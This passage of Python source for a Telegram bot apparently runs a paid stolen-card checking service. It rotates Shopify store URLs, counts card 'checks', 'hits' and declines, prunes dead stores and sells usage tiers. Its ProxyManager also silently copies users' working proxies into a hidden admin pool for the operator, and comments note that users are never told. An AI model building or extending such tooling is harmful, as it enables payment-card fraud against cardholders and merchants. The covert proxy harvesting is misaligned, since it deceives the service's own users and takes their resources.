            msg += f"  ... and {len(warning_sites) - 10} more\n"
        msg += "\n"
    
    # Dead sites
    if dead_sites:
        msg += "💀 <b>Dead Sites (will be removed):</b>\n"
        for site, fails, rate in dead_sites[:10]:
            msg += f"  • <code>{site}</code> (Fails: {fails})\n"
        if len(dead_sites) > 10:
            msg += f"  ... and {len(dead_sites) - 10} more\n"
        msg += "\n"
    
    msg += f"📊 <b>Summary:</b>\n"
    msg += f"  ✅ Healthy: {len(healthy_sites)}\n"
    msg += f"  ⚠️ Warning: {len(warning_sites)}\n"
    msg += f"  💀 Dead: {len(dead_sites)}\n"
    msg += f"  📝 Total: {len(sites)}\n\n"
    msg += f"💡 Use <code>/rsites dead</code> to remove dead sites"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def remove_dead_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove all sites with 3 or more failures"""
    user_id = update.effective_user.id
    sites = autosopi_site_manager.sites[:]  # Create a copy
    failures = autosopi_site_manager.site_failures
    
    dead_sites = []
    for site in sites:
        if failures.get(site, 0) >= 3:
            dead_sites.append(site)
    
    if not dead_sites:
        await update.message.reply_text("✅ No dead sites found.", reply_markup=back_menu())
        return
    
    msg = f"🗑️ <b>Removing {len(dead_sites)} dead sites...</b>\n\n"
    
    removed = []
    failed = []
    
    for site in dead_sites:
        success, result = autosopi_site_manager.remove_site(site, user_id)
        if success:
            removed.append(site)
        else:
            failed.append(site)
    
    if removed:
        msg += "<b>✅ Removed:</b>\n"
        for site in removed[:20]:
            msg += f"  • <code>{site}</code>\n"
        if len(removed) > 20:
            msg += f"  ... and {len(removed) - 20} more\n"
    
    if failed:
        msg += f"\n<b>❌ Failed to remove ({len(failed)}):</b>\n"
        for site in failed[:10]:
            msg += f"  • <code>{site}</code>\n"
    
    msg += f"\n📊 Total removed: {len(removed)}"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def remove_fake_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove all sites that return fake responses (authorize.net)"""
    user_id = update.effective_user.id
    sites = autosopi_site_manager.sites[:]
    
    fake_patterns = ["authorize.net", "authorizenet", "bndlstech", "fake-site"]
    
    fake_sites = []
    for site in sites:
        for pattern in fake_patterns:
            if pattern in site.lower():
                fake_sites.append(site)
                break
    
    if not fake_sites:
        await update.message.reply_text("✅ No fake sites found.", reply_markup=back_menu())
        return
    
    msg = f"🗑️ <b>Removing {len(fake_sites)} fake sites...</b>\n\n"
    
    removed = []
    failed = []
    
    for site in fake_sites:
        success, result = autosopi_site_manager.remove_site(site, user_id)
        if success:
            removed.append(site)
        else:
            failed.append(site)
    
    if removed:
        msg += "<b>✅ Removed:</b>\n"
        for site in removed[:20]:
            msg += f"  • <code>{site}</code>\n"
        if len(removed) > 20:
            msg += f"  ... and {len(removed) - 20} more\n"
    
    if failed:
        msg += f"\n<b>❌ Failed to remove ({len(failed)}):</b>\n"
        for site in failed[:10]:
            msg += f"  • <code>{site}</code>\n"
    
    msg += f"\n📊 Total removed: {len(removed)}"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def remove_all_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """⚠️ Remove ALL sites from rotation (requires confirmation)"""
    user_id = update.effective_user.id
    
    # Check if user is confirming
    if context.user_data.get('confirm_remove_all'):
        context.user_data.pop('confirm_remove_all', None)
        
        sites = autosopi_site_manager.sites[:]
        total = len(sites)
        
        if total == 0:
            await update.message.reply_text("📋 No sites to remove.", reply_markup=back_menu())
            return
        
        msg = f"🗑️ <b>Removing ALL {total} sites...</b>\n\n"
        
        removed = []
        failed = []
        
        for site in sites:
            success, result = autosopi_site_manager.remove_site(site, user_id)
            if success:
                removed.append(site)
            else:
                failed.append(site)
        
        await update.message.reply_text(
            f"✅ <b>Removed {len(removed)} sites</b>\n\n"
            f"❌ Failed: {len(failed)}\n"
            f"📊 Total removed: {len(removed)}",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        return
    
    # Ask for confirmation
    keyboard = [
        [
            InlineKeyboardButton("✅ YES, REMOVE ALL", callback_data='confirm_remove_all'),
            InlineKeyboardButton("❌ CANCEL", callback_data='cancel_remove_all')
        ]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"⚠️ <b>WARNING: Remove ALL Sites</b>\n\n"
        f"This will remove all {len(autosopi_site_manager.sites)} sites from rotation.\n\n"
        f"<b>This action cannot be undone!</b>\n\n"
        f"Are you sure?",
        parse_mode=ParseMode.HTML,
        reply_markup=markup
    )


async def remove_sites_by_pattern(update: Update, context: ContextTypes.DEFAULT_TYPE, pattern: str):
    """Remove sites matching a pattern"""
    user_id = update.effective_user.id
    sites = autosopi_site_manager.sites[:]
    
    matching_sites = []
    for site in sites:
        if pattern in site.lower():
            matching_sites.append(site)
    
    if not matching_sites:
        await update.message.reply_text(
            f"📋 No sites found matching: <code>{pattern}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        return
    
    msg = f"🗑️ <b>Removing {len(matching_sites)} sites matching:</b> <code>{pattern}</code>\n\n"
    
    removed = []
    failed = []
    
    for site in matching_sites:
        success, result = autosopi_site_manager.remove_site(site, user_id)
        if success:
            removed.append(site)
        else:
            failed.append(site)
    
    if removed:
        msg += "<b>✅ Removed:</b>\n"
        for site in removed[:20]:
            msg += f"  • <code>{site}</code>\n"
        if len(removed) > 20:
            msg += f"  ... and {len(removed) - 20} more\n"
    
    if failed:
        msg += f"\n<b>❌ Failed to remove ({len(failed)}):</b>\n"
        for site in failed[:10]:
            msg += f"  • <code>{site}</code>\n"
    
    msg += f"\n📊 Total removed: {len(removed)}"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def restore_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Restore a removed site (admin only)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can restore sites.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔄 <b>Restore Site</b>\n\n"
            "Usage: <code>/restoresite &lt;site_url&gt;</code>\n"
            "Example: <code>/restoresite savelacougars.myshopify.com</code>\n\n"
            "This will restore a previously removed site back to rotation.",
            parse_mode=ParseMode.HTML
        )
        return
    
    site = " ".join(context.args)
    site_normalized = autosopi_site_manager.normalize_site_url(site)
    
    # Check if site exists in failures
    if site_normalized in autosopi_site_manager.site_failures:
        # Reset failures
        autosopi_site_manager.site_failures[site_normalized] = 0
        
        # Add back if not already in sites
        if site_normalized not in autosopi_site_manager.sites:
            autosopi_site_manager.sites.append(site_normalized)
            autosopi_site_manager.site_stats[site_normalized] = {
                'successes': 0,
                'failures': 0,
                'total': 0,
                'site_dead_count': 0,
                'card_declines': 0,
                'added_by': user_id,
                'added_at': time.time(),
                'added_by_name': "Restored by admin"
            }
        
        autosopi_site_manager.save_sites()
        
        await update.message.reply_text(
            f"✅ <b>Site Restored</b>\n\n"
            f"📍 Site: <code>{site_normalized}</code>\n"
            f"🔄 Failures reset to 0\n"
            f"📝 Site added back to rotation",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
    else:
        await update.message.reply_text(
            f"❌ Site not found: <code>{site_normalized}</code>\n\n"
            f"Use <code>/rsites list</code> to see all sites.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )


async def confirm_remove_all_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle confirm remove all callback"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await query.edit_message_text("❌ Only the owner can remove all sites.", reply_markup=back_menu())
        return
    
    if query.data == 'confirm_remove_all':
        context.user_data['confirm_remove_all'] = True
        sites = autosopi_site_manager.sites[:]
        total = len(sites)
        
        if total == 0:
            await query.edit_message_text("📋 No sites to remove.", reply_markup=back_menu())
            return
        
        removed = []
        for site in sites:
            success, result = autosopi_site_manager.remove_site(site, user_id)
            if success:
                removed.append(site)
        
        await query.edit_message_text(
            f"✅ <b>Removed {len(removed)} sites</b>\n\n"
            f"📊 Total removed: {len(removed)}\n"
            f"📝 Sites list is now empty.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
    
    elif query.data == 'cancel_remove_all':
        await query.edit_message_text(
            "❌ Operation cancelled.\n\nNo sites were removed.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
# ============ USER INFO COMMAND ============

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user information - /info or /info <user_id> (admin can check others)"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    chat = update.effective_chat
    
    # Check if admin is checking another user
    target_id = user_id
    is_admin_checking_other = False
    
    if context.args:
        # Check if user is owner or admin
        if update.effective_user.id == OWNER_ID:
            try:
                target_id = int(context.args[0])
                is_admin_checking_other = True
            except ValueError:
                # If not a number, maybe it's a username
                try:
                    # Try to get user by username
                    username = context.args[0].replace('@', '')
                    # You'd need to look up user by username from your database
                    # For now, just show error
                    await update.message.reply_text(
                        "❌ Please provide a numeric user ID.\n"
                        "Example: /info 8250282523",
                        parse_mode=ParseMode.HTML
                    )
                    return
                except:
                    await update.message.reply_text(
                        "❌ Invalid user ID. Please provide a numeric ID.\n"
                        "Example: /info 8250282523",
                        parse_mode=ParseMode.HTML
                    )
                    return
    
    # Get target user info
    try:
        if target_id != user_id:
            # Try to get user info from Telegram
            try:
                target_user = await context.bot.get_chat(target_id)
                target_username = target_user.username or "NoUsername"
                target_first_name = target_user.first_name or "User"
            except:
                target_username = "Unknown"
                target_first_name = f"User {target_id}"
        else:
            target_user = update.effective_user
            target_username = target_user.username or "NoUsername"
            target_first_name = target_user.first_name
    except:
        target_username = "Unknown"
        target_first_name = f"User {target_id}"
    
    # Update user info in manager
    user_manager.update_user_info(target_id, target_username, target_first_name)
    
    # Get user stats
    stats = user_manager.get_user_stats(target_id)
    tier = stats['tier']
    tier_emoji = stats['emoji']
    
    # Get credit info
    credits = get_user_credits(target_id) if tier == 'free' else "∞"
    
    # Get plan expiry
    tier_expiry = stats.get('expiry_text', '')
    if tier_expiry:
        plan_expiry = tier_expiry.replace(" (expires: ", "").replace(")", "")
    else:
        plan_expiry = "Never" if tier in ['premium', 'ultimate', 'admin'] else "N/A"
    
    # Get keys redeemed
    user_data = user_manager.get_user(target_id)
    keys_redeemed = user_data.get('keys_redeemed', 0)
    
    # Get status
    if target_id == OWNER_ID:
        status = "👑 OWNER"
    elif tier == 'admin':
        status = "💀 ADMIN"
    elif tier == 'ultimate':
        status = "😈 ULTIMATE"
    elif tier == 'premium':
        status = "🔥 PREMIUM"
    else:
        # Check if user has any credits left
        if credits > 0:
            status = "🟢 ACTIVE"
        else:
            status = "🔴 INACTIVE"
    
    # Get join date
    joined = stats.get('joined', 'Unknown')
    
    # Get total checks and hits
    total_checks = stats['total_checks']
    total_hits = stats['total_hits']
    success_rate = (total_hits / total_checks * 100) if total_checks > 0 else 0
    
    # Get today's checks
    daily_checks = stats['daily_checks']
    daily_limit = stats['daily_limit'] if stats['daily_limit'] != float('inf') else "∞"
    
    # Format credit display
    if tier == 'free':
        if isinstance(credits, int):
            credit_display = f"{credits} credits"
        else:
            credit_display = str(credits)
    else:
        credit_display = "∞ (Unlimited)"
    
    # Build the info message
    info_msg = (
        f"🔍 <b>INFO BLADESARKS_BOT ⚡️</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f" 𝙄𝘿: <code>{target_id}</code>\n"
        f" 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{target_username}\n"
        f" 𝙉𝙖𝙢𝙚: {target_first_name}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f" 𝙎𝙩𝙖𝙩𝙪𝙨: {status}\n"
        f" 𝘾𝙧𝙚𝙙𝙞𝙩: {credit_display}\n"
        f" 𝙋𝙡𝙖𝙣: {tier_emoji} {tier.upper()}\n"
        f" 𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: {plan_expiry}\n"
        f" 𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: {keys_redeemed}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f" 📊 Checks: {total_checks}\n"
        f" 🎯 Hits: {total_hits}\n"
        f" 📈 Success: {success_rate:.1f}%\n"
        f" 📅 Today: {daily_checks}/{daily_limit}\n"
        f" 📅 Joined: {joined}\n"
    )
    
    # Add admin note if checking other user
    if is_admin_checking_other:
        info_msg += f"\n<i>ℹ️ Viewed by admin</i>"
    
    # Add mass check warning for free users
    if tier == 'free':
        info_msg += f"\n\n⚠️ <i>Free tier: Single checks only. Upgrade for mass checks!</i>"
    
    await update.message.reply_text(info_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())



# ============ UPDATED PROXY MANAGER WITH API-SPECIFIC POOLS ============

# ============ UPDATED PROXY MANAGER WITH API-SPECIFIC POOLS ============

class ProxyManager:
    """Per-user proxy manager with silent admin proxy collection and immediate failed proxy removal"""
    
    def __init__(self, stats_file='proxy_stats.json'):
        self.stats_file = stats_file
        
        # User proxies storage - ONLY per-user
        self.user_proxies = {}  # user_id -> list of raw proxies
        self.user_formatted_proxies = {}  # user_id -> list of formatted proxies
        self.user_proxy_index = {}  # user_id -> current index for round-robin
        self.user_failed_proxies = {}  # user_id -> set of failed proxies
        
        # API-specific proxy pools per user
        self.user_main_api_proxies = {}  # user_id -> list of proxies that work with MAIN API
        self.user_teamoicx_api_proxies = {}  # user_id -> list of proxies that work with TEAMOICX API
        self.user_main_api_index = {}  # user_id -> current index for MAIN API
        self.user_teamoicx_api_index = {}  # user_id -> current index for TEAMOICX API
        
        # Silent admin proxy pool - accumulates working proxies
        self.admin_proxies = []  # List of working proxies (raw format)
        self.admin_formatted_proxies = []  # List of formatted proxies
        self.admin_proxy_index = 0
        self.admin_proxy_file = "admin_proxies.txt"
        self.admin_proxy_stats = {}  # Track which proxies were added by which users
        
        # Statistics - per user
        self.proxy_stats = {}
        
        # Rotation indices for different gateways
        self.user_rotation_indices = {}
        
        # Load data
        self.load_stats()
        self.load_all_user_proxies()
        self.load_admin_proxies()
    
    def load_stats(self):
        """Load proxy statistics from file"""
        if Path(self.stats_file).exists():
            try:
                with open(self.stats_file, 'r') as f:
                    self.proxy_stats = json.load(f)
                print(f"📊 Loaded proxy statistics")
            except Exception as e:
                print(f"⚠️ Error loading proxy stats: {e}")
                self.proxy_stats = {}
    
    def save_stats(self):
        """Save proxy statistics to file"""
        try:
            with open(self.stats_file, 'w') as f:
                json.dump(self.proxy_stats, f, indent=2)
        except Exception as e:
            print(f"⚠️ Error saving proxy stats: {e}")
    
    def load_admin_proxies(self):
        """Load admin proxy pool from file"""
        if Path(self.admin_proxy_file).exists():
            try:
                with open(self.admin_proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        proxy = line.strip()
                        if proxy and not proxy.startswith('#'):
                            formatted = format_proxy(proxy)
                            if formatted:
                                self.admin_proxies.append(proxy)
                                self.admin_formatted_proxies.append(formatted)
                print(f"👑 Loaded {len(self.admin_proxies)} admin proxies from {self.admin_proxy_file}")
            except Exception as e:
                print(f"⚠️ Error loading admin proxies: {e}")
    
    def save_admin_proxies(self):
        """Save admin proxy pool to file"""
        try:
            with open(self.admin_proxy_file, 'w', encoding='utf-8') as f:
                for proxy in self.admin_proxies:
                    f.write(proxy + '\n')
            print(f"👑 Saved {len(self.admin_proxies)} admin proxies to {self.admin_proxy_file}")
        except Exception as e:
            print(f"⚠️ Error saving admin proxies: {e}")
    
    def add_to_admin_pool_silent(self, proxy: str, source_user_id: int = None):
        """Silently add a working proxy to admin pool"""
        if not proxy:
            return False
        
        # Check if already in admin pool
        if proxy in self.admin_proxies:
            return False
        
        # Format to ensure it's valid
        formatted = format_proxy(proxy)
        if not formatted:
            return False
        
        # Add to admin pools
        self.admin_proxies.append(proxy)
        self.admin_formatted_proxies.append(formatted)
        
        # Track source
        if source_user_id:
            proxy_key = proxy
            self.admin_proxy_stats[proxy_key] = {
                'added_at': time.time(),
                'source_user': source_user_id,
                'formatted': formatted
            }
        
        # Save to file
        self.save_admin_proxies()
        
        # Silent log - only to console, never to user
        print(f"👑 [SILENT] Working proxy added to admin pool from user {source_user_id}: {mask_proxy(proxy)}")
        
        return True
    
    def get_admin_proxy(self) -> Optional[str]:
        """Get next admin proxy for bot's internal use"""
        if not self.admin_formatted_proxies:
            return None
        
        # Round-robin selection
        selected = self.admin_formatted_proxies[self.admin_proxy_index % len(self.admin_formatted_proxies)]
        self.admin_proxy_index = (self.admin_proxy_index + 1) % len(self.admin_formatted_proxies)
        
        return selected
    
    def get_admin_proxy_count(self) -> int:
        """Get number of proxies in admin pool"""
        return len(self.admin_proxies)
    
    def get_admin_proxy_stats(self) -> dict:
        """Get admin pool statistics"""
        return {
            'total': len(self.admin_proxies),
            'proxies': self.admin_proxies[:10],
            'recent_adds': sorted(self.admin_proxy_stats.items(), key=lambda x: x[1]['added_at'], reverse=True)[:5]
        }
    
    def load_all_user_proxies(self):
        """Load all user proxies from user-specific files"""
        try:
            user_files = Path('.').glob('proxies_user_*.txt')
            for user_file in user_files:
                try:
                    user_id = int(user_file.stem.replace('proxies_user_', ''))
                    self.load_user_proxies(user_id)
                except ValueError:
                    continue
                except Exception as e:
                    print(f"⚠️ Error loading user proxies from {user_file}: {e}")
        except Exception as e:
            print(f"⚠️ Error scanning for user proxy files: {e}")
    
    def load_user_proxies(self, user_id: int):
        """Load user proxies from user-specific file"""
        filename = f"proxies_user_{user_id}.txt"
        if Path(filename).exists():
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.read().splitlines()
                    count = 0
                    for line in lines:
                        proxy = line.strip()
                        if proxy and not proxy.startswith('#'):
                            if self._add_user_proxy_internal(user_id, proxy):
                                count += 1
                if count > 0:
                    print(f"📦 Loaded {count} proxies for user {user_id} from {filename}")
            except Exception as e:
                print(f"⚠️ Error loading user proxies for {user_id}: {e}")
    
    def _add_user_proxy_internal(self, user_id: int, proxy: str) -> bool:
        """Internal method to add user proxy without saving to file"""
        # Initialize user data structures if not exist
        if user_id not in self.user_proxies:
            self.user_proxies[user_id] = []
            self.user_formatted_proxies[user_id] = []
            self.user_proxy_index[user_id] = 0
            self.user_failed_proxies[user_id] = set()
            self.user_main_api_proxies[user_id] = []
            self.user_teamoicx_api_proxies[user_id] = []
            self.user_main_api_index[user_id] = 0
            self.user_teamoicx_api_index[user_id] = 0
        
        # Check if proxy already exists for this user
        if proxy in self.user_proxies[user_id]:
            return False
        
        # Format the proxy
        formatted = format_proxy(proxy)
        if not formatted:
            return False
        
        # Add to user's proxy lists
        self.user_proxies[user_id].append(proxy)
        self.user_formatted_proxies[user_id].append(formatted)
        
        return True
    
    def add_user_proxy(self, user_id: int, proxy: str) -> bool:
        """Add a proxy for a specific user and save to file"""
        if self._add_user_proxy_internal(user_id, proxy):
            self._save_user_proxies(user_id)
            print(f"✅ Added proxy for user {user_id}: {mask_proxy(proxy)}")
            return True
        return False
    
    def remove_user_proxy(self, user_id: int, proxy: str) -> bool:
        """Remove a proxy for a specific user"""
        if user_id not in self.user_proxies:
            return False
        
        if proxy in self.user_proxies[user_id]:
            idx = self.user_proxies[user_id].index(proxy)
            self.user_proxies[user_id].remove(proxy)
            if idx < len(self.user_formatted_proxies[user_id]):
                self.user_formatted_proxies[user_id].pop(idx)
            
            # Remove from API-specific pools
            if user_id in self.user_main_api_proxies and proxy in self.user_main_api_proxies[user_id]:
                self.user_main_api_proxies[user_id].remove(proxy)
            if user_id in self.user_teamoicx_api_proxies and proxy in self.user_teamoicx_api_proxies[user_id]:
                self.user_teamoicx_api_proxies[user_id].remove(proxy)
            
            # Remove from failed set if present
            if user_id in self.user_failed_proxies and proxy in self.user_failed_proxies[user_id]:
                self.user_failed_proxies[user_id].remove(proxy)
            
            self._save_user_proxies(user_id)
            print(f"🗑️ Removed proxy for user {user_id}: {mask_proxy(proxy)}")
            return True
        return False
    
    def _save_user_proxies(self, user_id: int):
        """Save user proxies to a user-specific file"""
        try:
            if user_id in self.user_proxies and self.user_proxies[user_id]:
                filename = f"proxies_user_{user_id}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    for proxy in self.user_proxies[user_id]:
                        f.write(proxy + '\n')
                print(f"💾 Saved {len(self.user_proxies[user_id])} proxies for user {user_id}")
            else:
                filename = f"proxies_user_{user_id}.txt"
                if Path(filename).exists():
                    Path(filename).unlink()
        except Exception as e:
            print(f"⚠️ Error saving user proxies: {e}")
    
    def clear_user_proxies(self, user_id: int) -> bool:
        """Clear all proxies for a specific user"""
        if user_id in self.user_proxies:
            self.user_proxies[user_id] = []
            self.user_formatted_proxies[user_id] = []
            self.user_failed_proxies[user_id] = set()
            self.user_proxy_index[user_id] = 0
            self.user_main_api_proxies[user_id] = []
            self.user_teamoicx_api_proxies[user_id] = []
            self.user_main_api_index[user_id] = 0
            self.user_teamoicx_api_index[user_id] = 0
            
            filename = f"proxies_user_{user_id}.txt"
            if Path(filename).exists():
                Path(filename).unlink()
            
            print(f"🗑️ Cleared all proxies for user {user_id}")
            return True
        return False
    
    def get_user_proxies(self, user_id: int) -> list:
        """Get all proxies for a specific user"""
        return self.user_proxies.get(user_id, [])
    
    def get_user_proxy_count(self, user_id: int) -> int:
        """Get number of proxies for a specific user"""
        return len(self.user_proxies.get(user_id, []))
    
    def mark_proxy_for_api(self, user_id: int, proxy: str, api_name: str, is_working: bool):
        """Mark a proxy as working or not working for a specific API"""
        if user_id not in self.user_proxies or proxy not in self.user_proxies[user_id]:
            return
        
        if api_name == 'MAIN API':
            api_pool = self.user_main_api_proxies
            api_index = self.user_main_api_index
        elif api_name == 'TEAMOICX API':
            api_pool = self.user_teamoicx_api_proxies
            api_index = self.user_teamoicx_api_index
        else:
            return
        
        # Initialize if needed
        if user_id not in api_pool:
            api_pool[user_id] = []
        if user_id not in api_index:
            api_index[user_id] = 0
        
        if is_working:
            # Add to API pool if not already there
            if proxy not in api_pool[user_id]:
                api_pool[user_id].append(proxy)
                print(f"✅ Proxy {mask_proxy(proxy)} added to {api_name} pool for user {user_id}")
        else:
            # Remove from API pool if present
            if proxy in api_pool[user_id]:
                api_pool[user_id].remove(proxy)
                print(f"❌ Proxy {mask_proxy(proxy)} removed from {api_name} pool for user {user_id}")
    
    def get_next_proxy_for_api(self, user_id: int, api_name: str) -> Optional[str]:
        """Get next proxy for a specific API"""
        if api_name == 'MAIN API':
            api_pool = self.user_main_api_proxies
            api_index = self.user_main_api_index
        elif api_name == 'TEAMOICX API':
            api_pool = self.user_teamoicx_api_proxies
            api_index = self.user_teamoicx_api_index
        else:
            return None
        
        # Check if user has proxies for this API
        if user_id in api_pool and api_pool[user_id]:
            proxies = api_pool[user_id]
            
            # Get current index
            idx = api_index.get(user_id, 0)
            selected = proxies[idx % len(proxies)]
            api_index[user_id] = (idx + 1) % len(proxies)
            
            # Get formatted version
            if selected in self.user_proxies[user_id]:
                proxy_idx = self.user_proxies[user_id].index(selected)
                formatted = self.user_formatted_proxies[user_id][proxy_idx]
                print(f"🔄 User {user_id} using {api_name} proxy: {mask_proxy(selected)}")
                return formatted
        
        return None
    
    def get_next_proxy_for_user(self, user_id: int) -> Optional[str]:
        """Get next proxy for a specific user"""
        if user_id in self.user_formatted_proxies and self.user_formatted_proxies[user_id]:
            user_proxies = self.user_formatted_proxies[user_id]
            failed_set = self.user_failed_proxies.get(user_id, set())
            raw_proxies = self.user_proxies.get(user_id, [])
            
            # Build list of available proxies (not failed)
            available = []
            available_raw = []
            for i, proxy in enumerate(user_proxies):
                if i < len(raw_proxies) and raw_proxies[i] not in failed_set:
                    available.append(proxy)
                    available_raw.append(raw_proxies[i])
            
            # If all failed, reset failed for this user
            if not available and user_proxies:
                print(f"🔄 All proxies failed for user {user_id}, resetting failed list")
                self.user_failed_proxies[user_id] = set()
                available = user_proxies
                available_raw = raw_proxies
            
            if available:
                idx = self.user_proxy_index.get(user_id, 0)
                selected_idx = idx % len(available)
                selected = available[selected_idx]
                self.user_proxy_index[user_id] = (idx + 1) % len(available)
                
                if selected_idx < len(available_raw):
                    print(f"🔄 User {user_id} using proxy: {mask_proxy(available_raw[selected_idx])}")
                
                return selected
        
        print(f"⚠️ User {user_id} has no proxies")
        return None
    
    def get_rotating_proxy_for_user(self, user_id: int, gateway: str = 'default') -> Optional[str]:
        """Get next proxy in rotation for a specific user and gateway"""
        if not user_manager.can_use_proxy(user_id):
            return None
        
        # Check if user has any proxies
        if user_id not in self.user_proxies or not self.user_proxies[user_id]:
            return None
        
        # Get ALL available proxies (failed ones are already removed)
        available_proxies = self.user_proxies[user_id].copy()
        
        if not available_proxies:
            return None
        
        # Create rotation index
        rotation_key = f"{user_id}_{gateway}"
        if rotation_key not in self.user_rotation_indices:
            self.user_rotation_indices[rotation_key] = 0
        
        # Get next proxy
        idx = self.user_rotation_indices[rotation_key] % len(available_proxies)
        selected_raw = available_proxies[idx]
        
        # Update index
        self.user_rotation_indices[rotation_key] = (idx + 1) % len(available_proxies)
        
        # Format the proxy
        formatted = format_proxy(selected_raw)
        
        print(f"🔄 User {user_id} using proxy #{idx + 1}/{len(available_proxies)}: {mask_proxy(formatted or selected_raw)}")
        
        return formatted or selected_raw
    
    def mark_proxy_success_for_user(self, user_id: int, proxy: str):
        """Mark a proxy as successful for a specific user - may trigger admin pool addition"""
        if not proxy:
            return
        
        raw = self.get_raw_proxy(proxy, user_id)
        if not raw:
            return
        
        if user_id in self.user_failed_proxies and raw in self.user_failed_proxies[user_id]:
            self.user_failed_proxies[user_id].remove(raw)
        
        self._update_proxy_stats(user_id, raw, success=True)
        
        # SILENTLY add working proxy to admin pool
        self._check_and_add_to_admin_pool(user_id, raw, True)
    
    def mark_proxy_failure_for_user(self, user_id: int, proxy: str):
        """Mark a proxy as failed and remove it immediately"""
        if not proxy:
            return
        
        raw = self.get_raw_proxy(proxy, user_id)
        if not raw:
            return
        
        # Add to failed set (for tracking)
        if user_id not in self.user_failed_proxies:
            self.user_failed_proxies[user_id] = set()
        self.user_failed_proxies[user_id].add(raw)
        
        # Update statistics
        self._update_proxy_stats(user_id, raw, success=False)
        
        # IMMEDIATELY REMOVE THE FAILED PROXY
        self.remove_failed_proxy_immediately(user_id, proxy)
    
    def remove_failed_proxy_immediately(self, user_id: int, proxy: str):
        """Immediately remove a failed proxy from user's pool"""
        if not proxy:
            return False
        
        # Get the raw proxy from formatted version
        raw_proxy = self.get_raw_proxy(proxy, user_id)
        if not raw_proxy:
            # If we can't get raw, try with the provided string
            raw_proxy = proxy
        
        # Remove from user's proxy list
        if user_id in self.user_proxies and raw_proxy in self.user_proxies[user_id]:
            idx = self.user_proxies[user_id].index(raw_proxy)
            self.user_proxies[user_id].remove(raw_proxy)
            
            # Remove from formatted proxies
            if idx < len(self.user_formatted_proxies.get(user_id, [])):
                self.user_formatted_proxies[user_id].pop(idx)
            
            # Remove from API-specific pools
            if user_id in self.user_main_api_proxies and raw_proxy in self.user_main_api_proxies[user_id]:
                self.user_main_api_proxies[user_id].remove(raw_proxy)
            
            if hasattr(self, 'user_backup_api_proxies') and user_id in self.user_backup_api_proxies and raw_proxy in self.user_backup_api_proxies[user_id]:
                self.user_backup_api_proxies[user_id].remove(raw_proxy)
            
            # Remove from failed set
            if user_id in self.user_failed_proxies and raw_proxy in self.user_failed_proxies[user_id]:
                self.user_failed_proxies[user_id].remove(raw_proxy)
            
            # Save updated proxies
            self._save_user_proxies(user_id)
            
            print(f"🗑️ [IMMEDIATE] Removed failed proxy for user {user_id}: {mask_proxy(raw_proxy)}")
            return True
        
        return False
    
    def _update_proxy_stats(self, user_id: int, raw_proxy: str, success: bool):
        """Update statistics for a proxy"""
        key = f"{user_id}:{raw_proxy}"
        if key not in self.proxy_stats:
            self.proxy_stats[key] = {
                'successes': 0,
                'failures': 0,
                'total': 0,
                'user_id': user_id,
                'proxy': raw_proxy,
                'first_seen': time.time(),
                'last_seen': time.time()
            }
        
        stats = self.proxy_stats[key]
        stats['last_seen'] = time.time()
        
        if success:
            stats['successes'] = stats.get('successes', 0) + 1
            stats['last_success'] = time.time()
        else:
            stats['failures'] = stats.get('failures', 0) + 1
            stats['last_fail'] = time.time()
        
        stats['total'] = stats.get('total', 0) + 1
        
        self.save_stats()
    
    def _check_and_add_to_admin_pool(self, user_id: int, raw_proxy: str, success: bool):
        """Check if proxy is working and silently add to admin pool"""
        if success and raw_proxy:
            self.add_to_admin_pool_silent(raw_proxy, user_id)
    
    def get_raw_proxy(self, formatted_proxy: str, user_id: int = None) -> Optional[str]:
        """Get raw proxy from formatted version"""
        if user_id and user_id in self.user_formatted_proxies:
            user_raw = self.user_proxies.get(user_id, [])
            user_formatted = self.user_formatted_proxies.get(user_id, [])
            for raw, formatted in zip(user_raw, user_formatted):
                if formatted == formatted_proxy:
                    return raw
        return None
    
    def get_user_proxy_stats(self, user_id: int) -> dict:
        """Get proxy statistics for a specific user"""
        if user_id not in self.user_proxies:
            return {
                "total": 0,
                "working": 0,
                "failed": 0,
                "success_rate": 0,
                "proxies": [],
                "main_api_proxies": 0,
                "teamoicx_api_proxies": 0
            }
        
        total = len(self.user_proxies[user_id])
        failed = len(self.user_failed_proxies.get(user_id, set()))
        working = total - failed
        main_api_count = len(self.user_main_api_proxies.get(user_id, []))
        teamoicx_api_count = len(self.user_teamoicx_api_proxies.get(user_id, []))
        
        return {
            "total": total,
            "working": working,
            "failed": failed,
